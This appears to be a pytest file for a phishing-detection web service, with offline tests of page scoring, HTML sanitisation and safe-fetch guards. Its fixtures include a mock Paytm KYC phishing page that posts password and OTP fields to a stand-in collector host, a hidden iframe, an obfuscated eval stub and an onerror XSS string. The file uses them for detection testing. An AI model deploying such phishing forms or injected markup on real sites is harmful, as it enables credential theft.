# backend/tests/test_page_service.py   run:  python -m pytest tests -q
# All offline: the network is faked, so these are fast and never touch a real site.
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from services import page_service as ps

PHISH = """<html><head><title>Paytm KYC Update</title></head><body>
<h1>Your account will be suspended within 24 hours</h1><p>Verify your KYC now.</p>
<form action="http://collector.example.net/steal.php" method="post">
  <input name="mobile"><input type="password" name="pwd"><input name="otp" placeholder="Enter OTP">
</form>
<iframe src="https://evil-ads.example.org/x" width="0" height="0"></iframe>
<script>eval(atob("%s"))</script></body></html>""" % ("A" * 250)

CLEAN = """<html><head><title>Ravi's Bakery</title></head><body>
<h1>Fresh bread daily</h1><p>%s</p>
<form action="/subscribe"><input name="email"></form></body></html>""" % ("bread " * 60)

GTM = """<html><head><title>Shop</title></head><body>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-X" height="0" width="0"
 style="display:none;visibility:hidden"></iframe></noscript><p>hello</p></body></html>"""


def codes(r):
    return {s["code"] for s in r["signals"]}


# ---------------------------------------------------------------- analysis
def test_phishing_page_scores_high_and_is_capped():
    r = ps.analyze_html(PHISH, "http://paytm-kyc-verify.xyz/login")
    assert {"password_field", "sensitive_fields", "cross_domain_form", "brand_impersonation",
            "urgent_language", "hidden_iframe", "obfuscated_js", "insecure_password"} <= codes(r)
    assert r["risk_points"] == ps.MAX_RISK_POINTS          # capped at 40


def test_clean_page_has_no_points():
    r = ps.analyze_html(CLEAN, "https://ravisbakery.in")
    assert r["risk_points"] == 0 and r["signals"] == []


def test_googletagmanager_hidden_iframe_not_flagged():
    assert "hidden_iframe" not in codes(ps.analyze_html(GTM, "https://myshop.in"))


def test_same_site_login_is_only_a_small_signal():
    html = '<title>Sign in</title><form action="/login"><input type="password" name="p"></form>'
    r = ps.analyze_html(html, "https://smallsaas.io/login")
    assert codes(r) == {"password_field"} and r["risk_points"] == 6


def test_sign_in_with_google_button_is_not_impersonation():
    html = ('<title>Acme login</title><form action="/l"><input type="password"></form>'
            "<button>Sign in with Google</button>")
    assert "brand_impersonation" not in codes(ps.analyze_html(html, "https://acme.io"))


def test_js_only_page_is_reported_honestly_with_zero_points():
    r = ps.analyze_html("<html><body><div id=app></div><script src=x.js></script></body></html>",
                        "https://spa.example")
    assert codes(r) == {"js_only_page"} and r["risk_points"] == 0


def test_hostile_text_is_sanitised():
    html = '<title><img src=x onerror=alert(1)>Paytm</title><form action="http://e.xyz"><input type=password></form>'
    r = ps.analyze_html(html, "https://evil.xyz")
    assert "<" not in str(r) and ">" not in str(r)         # no raw HTML survives into our JSON


def test_broken_html_never_raises():
    ps.analyze_html("<<<form <input type=password <iframe", "https://x.example")


# ---------------------------------------------------------------- safe fetch guards
def test_private_and_bad_targets_are_refused_without_network():
    for u in ["http://127.0.0.1/", "http://192.168.1.5/x", "http://localhost/",
              "ftp://example.com/", "http://example.com:8080/", "file:///etc/passwd"]:
        assert ps.fetch_page(u)["html"] is None, u


class _Resp:
    def __init__(self, status=200, ctype="text/html; charset=utf-8", chunks=(b"<html></html>",)):
        self.status_code, self.headers, self._chunks = status, {"Content-Type": ctype}, chunks
        self.closed = False

    def iter_content(self, chunk_size=8192):
        yield from self._chunks

    def close(self):
        self.closed = True


def _patch(monkeypatch, resp):
    seen = {}
    monkeypatch.setattr(ps, "_is_private", lambda h: False)

    def fake_get(url, **kw):
        seen.update(kw)
        return resp
    monkeypatch.setattr(ps.requests, "get", fake_get)
    return seen


def test_fetch_never_follows_redirects_and_uses_timeout(monkeypatch):
    seen = _patch(monkeypatch, _Resp(status=302))
    r = ps.fetch_page("https://example.com/")
    assert r["html"] is None and seen["allow_redirects"] is False and seen["timeout"] == ps.TIMEOUT


def test_fetch_rejects_non_html(monkeypatch):
    _patch(monkeypatch, _Resp(ctype="application/pdf"))
    assert ps.fetch_page("https://example.com/a")["html"] is None


def test_fetch_caps_size(monkeypatch):
    big = (b"a" * 100_000,) * 10                         # 1 MB offered
    resp = _Resp(chunks=big)
    _patch(monkeypatch, resp)
    r = ps.fetch_page("https://example.com/")
    assert r["bytes_read"] == ps.MAX_BYTES and r["truncated"] and resp.closed


# ---------------------------------------------------------------- public entry point
def test_trusted_domain_is_not_fetched(monkeypatch):
    monkeypatch.setattr(ps, "fetch_page", lambda u: (_ for _ in ()).throw(AssertionError("fetched")))
    r = ps.analyze_page("https://www.google.com/")
    assert r["checked"] is False and r["risk_points"] == 0


def test_analyze_page_never_raises_and_never_negative(monkeypatch):
    monkeypatch.setattr(ps, "fetch_page", lambda u: (_ for _ in ()).throw(RuntimeError("boom")))
    r = ps.analyze_page("https://unknown-site.example/")
    assert r["risk_points"] == 0.0 and "failed" in r["note"]


def test_end_to_end_with_fake_page(monkeypatch):
    _patch(monkeypatch, _Resp(chunks=(PHISH.encode(),)))
    r = ps.analyze_page("https://paytm-kyc-verify.xyz/login")
    assert r["checked"] and r["risk_points"] >= 30 and r["reasons"]